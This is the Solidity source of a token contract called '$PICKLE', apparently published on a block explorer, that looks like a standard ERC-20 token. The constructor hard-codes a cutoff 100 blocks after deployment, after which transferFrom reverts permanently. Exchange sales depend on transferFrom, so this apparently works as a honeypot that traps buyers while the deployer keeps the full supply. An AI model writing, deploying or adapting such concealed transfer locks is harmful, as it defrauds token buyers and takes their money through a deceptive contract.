/**
 *Submitted for verification at Arbiscan on 2023-05-17
*/

/// SPDX-License-Identifier: MIT

pragma solidity 0.8.4;

contract $PICKLE {
    string public name = "$PICKLE";
    string public symbol = "$PICKLE";
    uint256 public totalSupply = 69000000000000000000000000;
    uint8 public decimals = 18;
    uint256 public disableTransferAfterBlock;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        disableTransferAfterBlock = block.number + 100; // Set the block number after which transferFrom will be disabled
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(block.number <= disableTransferAfterBlock, "TransferFrom is disabled.");
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
}